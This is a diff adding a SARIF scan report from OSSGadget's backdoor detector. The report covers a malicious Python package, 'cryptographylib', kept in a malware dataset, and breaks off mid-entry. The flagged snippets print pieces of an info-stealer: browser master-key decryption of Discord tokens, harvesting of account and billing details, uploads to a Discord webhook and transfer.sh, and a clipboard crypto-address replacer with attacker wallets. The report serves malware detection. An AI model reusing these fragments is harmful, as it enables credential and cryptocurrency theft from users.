@@ -1,0 +1,2609 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.1.428+ed0e2cfe6a"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 641,
+                  "startColumn": 61,
+                  "endLine": 641,
+                  "endColumn": 67,
+                  "snippet": {
+                    "text": "                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\r\n                            for y in re.findall(self.encrypted_regex, line):\r\n                                try:\r\n                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\r\n                                except ValueError:\r\n                                    pass\r\n                                try:\r\n",
+                    "rendered": {
+                      "text": "                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\r\n                            for y in re.findall(self.encrypted_regex, line):\r\n                                try:\r\n                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\r\n                                except ValueError:\r\n                                    pass\r\n                                try:\r\n",
+                      "markdown": "`                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\r\n                            for y in re.findall(self.encrypted_regex, line):\r\n                                try:\r\n                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\r\n                                except ValueError:\r\n                                    pass\r\n                                try:\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 594,
+                  "startColumn": 21,
+                  "endLine": 594,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "        with open(path, \"r\", encoding=\"utf-8\") as f:\r\n            c = f.read()\r\n        local_state = json.loads(c)\r\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n        master_key = master_key[5:]\r\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\r\n        return master_key\r\n",
+                    "rendered": {
+                      "text": "        with open(path, \"r\", encoding=\"utf-8\") as f:\r\n            c = f.read()\r\n        local_state = json.loads(c)\r\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n        master_key = master_key[5:]\r\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\r\n        return master_key\r\n",
+                      "markdown": "`        with open(path, \"r\", encoding=\"utf-8\") as f:\r\n            c = f.read()\r\n        local_state = json.loads(c)\r\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n        master_key = master_key[5:]\r\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\r\n        return master_key\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 36,
+                  "startColumn": 5,
+                  "endLine": 36,
+                  "endColumn": 11,
+                  "snippet": {
+                    "text": "\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\nfrom datetime import datetime, timedelta, timezone\r\n",
+                    "rendered": {
+                      "text": "\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\nfrom datetime import datetime, timedelta, timezone\r\n",
+                      "markdown": "`\r\n\r\nfrom sqlite3 import connect\r\nfrom base64 import b64decode\r\nfrom urllib.request import Request, urlopen\r\nfrom shutil import copy2\r\nfrom datetime import datetime, timedelta, timezone\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 7,
+                  "endLine": 28,
+                  "endColumn": 13,
+                  "snippet": {
+                    "text": "import zipfile\r\nimport httpx\r\nimport psutil\r\nimport base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\n",
+                    "rendered": {
+                      "text": "import zipfile\r\nimport httpx\r\nimport psutil\r\nimport base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\n",
+                      "markdown": "`import zipfile\r\nimport httpx\r\nimport psutil\r\nimport base64\r\nimport requests\r\nimport ctypes\r\nimport time\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000804"
+          },
+          "message": {
+            "text": "Backdoor: Long Strings",
+            "id": "BD000804"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 702,
+                  "startColumn": 55,
+                  "endLine": 702,
+                  "endColumn": 119,
+                  "snippet": {
+                    "text": "                                    \r\n\r\n    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):\r\n        filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\r\n        path = os.path.join(_dir, filname)\r\n        open(path, \"x\")\r\n        return path\r\n",
+                    "rendered": {
+                      "text": "                                    \r\n\r\n    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):\r\n        filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\r\n        path = os.path.join(_dir, filname)\r\n        open(path, \"x\")\r\n        return path\r\n",
+                      "markdown": "`                                    \r\n\r\n    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):\r\n        filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\r\n        path = os.path.join(_dir, filname)\r\n        open(path, \"x\")\r\n        return path\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000804"
+          },
+          "message": {
+            "text": "Backdoor: Long Strings",
+            "id": "BD000804"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 166,
+                  "startColumn": 55,
+                  "endLine": 166,
+                  "endColumn": 119,
+                  "snippet": {
+                    "text": "\r\n    @staticmethod\r\n    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):\r\n        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\r\n        path = ntpath.join(_dir, f1lenom)\r\n        open(path, \"x\")\r\n        return path\r\n",
+                    "rendered": {
+                      "text": "\r\n    @staticmethod\r\n    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):\r\n        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\r\n        path = ntpath.join(_dir, f1lenom)\r\n        open(path, \"x\")\r\n        return path\r\n",
+                      "markdown": "`\r\n    @staticmethod\r\n    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):\r\n        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\r\n        path = ntpath.join(_dir, f1lenom)\r\n        open(path, \"x\")\r\n        return path\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000804"
+          },
+          "message": {
+            "text": "Backdoor: Long Strings",
+            "id": "BD000804"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 82,
+                  "startColumn": 20,
+                  "endLine": 82,
+                  "endColumn": 125,
+                  "snippet": {
+                    "text": "    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\r\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\r\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\r\n    'blprggg':\r\n    [\r\n",
+                    "rendered": {
+                      "text": "    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\r\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\r\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\r\n    'blprggg':\r\n    [\r\n",
+                      "markdown": "`    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\r\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\r\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\r\n    'blprggg':\r\n    [\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000804"
+          },
+          "message": {
+            "text": "Backdoor: Long Strings",
+            "id": "BD000804"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 81,
+                  "startColumn": 23,
+                  "endLine": 81,
+                  "endColumn": 120,
+                  "snippet": {
+                    "text": "    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\r\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\r\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\r\n    'blprggg':\r\n",
+                    "rendered": {
+                      "text": "    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\r\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\r\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\r\n    'blprggg':\r\n",
+                      "markdown": "`    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\r\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\r\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\r\n    'blprggg':\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000804"
+          },
+          "message": {
+            "text": "Backdoor: Long Strings",
+            "id": "BD000804"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 77,
+                  "startColumn": 20,
+                  "endLine": 77,
+                  "endColumn": 64,
+                  "snippet": {
+                    "text": "    \r\n    'addresse_crypto_replacer': 'yes',\r\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\r\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\r\n    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n",
+                    "rendered": {
+                      "text": "    \r\n    'addresse_crypto_replacer': 'yes',\r\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\r\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\r\n    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n",
+                      "markdown": "`    \r\n    'addresse_crypto_replacer': 'yes',\r\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\r\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\r\n    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n    'addresse_cchain': 'none',\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000804"
+          },
+          "message": {
+            "text": "Backdoor: Long Strings",
+            "id": "BD000804"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 76,
+                  "startColumn": 20,
+                  "endLine": 76,
+                  "endColumn": 64,
+                  "snippet": {
+                    "text": "    'dbugkiller': False,\r\n    \r\n    'addresse_crypto_replacer': 'yes',\r\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\r\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\r\n    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n",
+                    "rendered": {
+                      "text": "    'dbugkiller': False,\r\n    \r\n    'addresse_crypto_replacer': 'yes',\r\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\r\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\r\n    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n",
+                      "markdown": "`    'dbugkiller': False,\r\n    \r\n    'addresse_crypto_replacer': 'yes',\r\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\r\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\r\n    'addresse_xchain': 'none',\r\n    'addresse_pchain': 'none',\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 2
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1631,
+                  "startColumn": 25,
+                  "endLine": 1631,
+                  "endColumn": 31,
+                  "snippet": {
+                    "text": "\r\n        files = { \"file\": (path, open(path, mode='rb')) }\r\n        ...\r\n        upload = requests.post(\"https://transfer.sh/\", files=files)\r\n        url = upload.text\r\n        return url\r\n    except:\r\n",
+                    "rendered": {
+                      "text": "\r\n        files = { \"file\": (path, open(path, mode='rb')) }\r\n        ...\r\n        upload = requests.post(\"https://transfer.sh/\", files=files)\r\n        url = upload.text\r\n        return url\r\n    except:\r\n",
+                      "markdown": "`\r\n        files = { \"file\": (path, open(path, mode='rb')) }\r\n        ...\r\n        upload = requests.post(\"https://transfer.sh/\", files=files)\r\n        url = upload.text\r\n        return url\r\n    except:\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1283,
+                  "startColumn": 32,
+                  "endLine": 1283,
+                  "endColumn": 38,
+                  "snippet": {
+                    "text": "                    if r.status_code == 200:\r\n                        return r\r\n                elif files != '':\r\n                    r = requests.post(url, files=files)\r\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\r\n                        return r\r\n        except:\r\n",
+                    "rendered": {
+                      "text": "                    if r.status_code == 200:\r\n                        return r\r\n                elif files != '':\r\n                    r = requests.post(url, files=files)\r\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\r\n                        return r\r\n        except:\r\n",
+                      "markdown": "`                    if r.status_code == 200:\r\n                        return r\r\n                elif files != '':\r\n                    r = requests.post(url, files=files)\r\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\r\n                        return r\r\n        except:\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1279,
+                  "startColumn": 32,
+                  "endLine": 1279,
+                  "endColumn": 38,
+                  "snippet": {
+                    "text": "        try:\r\n            if methode == 'POST':\r\n                if data != '':\r\n                    r = requests.post(url, data=data)\r\n                    if r.status_code == 200:\r\n                        return r\r\n                elif files != '':\r\n",
+                    "rendered": {
+                      "text": "        try:\r\n            if methode == 'POST':\r\n                if data != '':\r\n                    r = requests.post(url, data=data)\r\n                    if r.status_code == 200:\r\n                        return r\r\n                elif files != '':\r\n",
+                      "markdown": "`        try:\r\n            if methode == 'POST':\r\n                if data != '':\r\n                    r = requests.post(url, data=data)\r\n                    if r.status_code == 200:\r\n                        return r\r\n                elif files != '':\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1236,
+                  "startColumn": 25,
+                  "endLine": 1236,
+                  "endColumn": 30,
+                  "snippet": {
+                    "text": "Threadlist = []\r\n\r\ndef fetch_conf(e: str) -> str or bool | None:\r\n        return __config__.get(e)\r\n\r\nhook = fetch_conf(\"yourwebhookurl\")\r\n\r\n",
+                    "rendered": {
+                      "text": "Threadlist = []\r\n\r\ndef fetch_conf(e: str) -> str or bool | None:\r\n        return __config__.get(e)\r\n\r\nhook = fetch_conf(\"yourwebhookurl\")\r\n\r\n",
+                      "markdown": "`Threadlist = []\r\n\r\ndef fetch_conf(e: str) -> str or bool | None:\r\n        return __config__.get(e)\r\n\r\nhook = fetch_conf(\"yourwebhookurl\")\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1111,
+                  "startColumn": 21,
+                  "endLine": 1111,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "        with open(_zipfile, 'rb') as f:\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                httpx.post(self.discord_webhook, json=embed)\r\n                httpx.post(self.discord_webhook, files={'upload_file': f})\r\n        os.remove(_zipfile)\r\n\r\n\r\n",
+                    "rendered": {
+                      "text": "        with open(_zipfile, 'rb') as f:\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                httpx.post(self.discord_webhook, json=embed)\r\n                httpx.post(self.discord_webhook, files={'upload_file': f})\r\n        os.remove(_zipfile)\r\n\r\n\r\n",
+                      "markdown": "`        with open(_zipfile, 'rb') as f:\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                httpx.post(self.discord_webhook, json=embed)\r\n                httpx.post(self.discord_webhook, files={'upload_file': f})\r\n        os.remove(_zipfile)\r\n\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1110,
+                  "startColumn": 21,
+                  "endLine": 1110,
+                  "endColumn": 27,
+                  "snippet": {
+                    "text": "\r\n        with open(_zipfile, 'rb') as f:\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                httpx.post(self.discord_webhook, json=embed)\r\n                httpx.post(self.discord_webhook, files={'upload_file': f})\r\n        os.remove(_zipfile)\r\n\r\n",
+                    "rendered": {
+                      "text": "\r\n        with open(_zipfile, 'rb') as f:\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                httpx.post(self.discord_webhook, json=embed)\r\n                httpx.post(self.discord_webhook, files={'upload_file': f})\r\n        os.remove(_zipfile)\r\n\r\n",
+                      "markdown": "`\r\n        with open(_zipfile, 'rb') as f:\r\n            if self.regex_webhook_dsc in self.discord_webhook:\r\n                httpx.post(self.discord_webhook, json=embed)\r\n                httpx.post(self.discord_webhook, files={'upload_file': f})\r\n        os.remove(_zipfile)\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 940,
+                  "startColumn": 47,
+                  "endLine": 940,
+                  "endColumn": 52,
+                  "snippet": {
+                    "text": "            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n            billing = bool(len(json.loads(httpx.get(self.dscap1 + \"/billing/payment-sources\", headers=self.g3t_H(token)).text)) > 0)\r\n\r\n\r\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nBilling?: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nPhone: {phone}\\nToken: {token}\\nEmail: {email}\\n\\n\")\r\n",
+                    "rendered": {
+                      "text": "            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()\r\n            has_nitro = False\r\n            has_nitro = bool(len(nitro_data) > 0)\r\n            billing = bool(len(json.loads(httpx.get(self.dscap1 + \"/billing/payment-sources\", headers=self.g3t_H(token)).text)) > 0)\r\n\r\n\r\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nBilling?: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nPhone: {phone}\\nToken: {token}\\nEmail: {email}\\n\\n\")\r\n",
